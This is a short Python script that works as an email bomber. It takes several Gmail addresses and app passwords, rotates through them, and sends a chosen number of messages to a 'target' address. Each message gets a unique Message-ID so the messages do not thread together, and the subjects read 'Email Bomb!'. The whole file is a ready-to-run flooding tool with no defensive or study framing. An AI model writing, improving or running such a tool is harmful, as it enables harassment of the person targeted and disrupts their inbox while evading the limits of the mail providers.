import smtplib
from email.message import EmailMessage
import time
import uuid

def collect_senders():
    senders = []
    try:
        num = int(input("🧑‍💻 How many sender Gmail accounts will you use? "))
    except ValueError:
        print("❌ Invalid input. Must be a number.")
        exit()

    for i in range(num):
        print(f"\n📥 Enter details for sender #{i+1}:")
        email = input("📧 Gmail address: ").strip()
        password = input("🔑 App password: ").strip()
        senders.append({"email": email, "password": password})

    return senders

def send_emails(senders, target_email, count, content):
    for i in range(count):
        sender = senders[i % len(senders)]  # Rotate through senders
        msg = EmailMessage()
        msg['Subject'] = f'💣 Email Bomb! #{i+1}'
        msg['From'] = sender["email"]
        msg['To'] = target_email
        msg.set_content(f"{content}\n\nMessage Number: {i+1}")

        # Unique Message-ID to avoid threading
        unique_id = f"<{uuid.uuid4()}@{sender['email'].split('@')[1]}>"
        msg['Message-ID'] = unique_id

        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender["email"], sender["password"])
            server.send_message(msg)
            server.quit()
            print(f"✅ Email #{i+1} sent from {sender['email']} to {target_email}")
            time.sleep(5)
        except Exception as e:
            print(f"❌ Failed to send from {sender['email']}: {e}")

    print(f"\n🔚 Completed sending {count} emails.")

if __name__ == "__main__":
    senders = collect_senders()

    target = input("\n🎯 Enter target email: ").strip()
    try:
        count = int(input("📨 How many emails to send? "))
    except ValueError:
        print("❌ Invalid input. Must be a number.")
        exit()

    content = input("✉️ Enter the email content: ").strip()

    send_emails(senders, target, count, content)
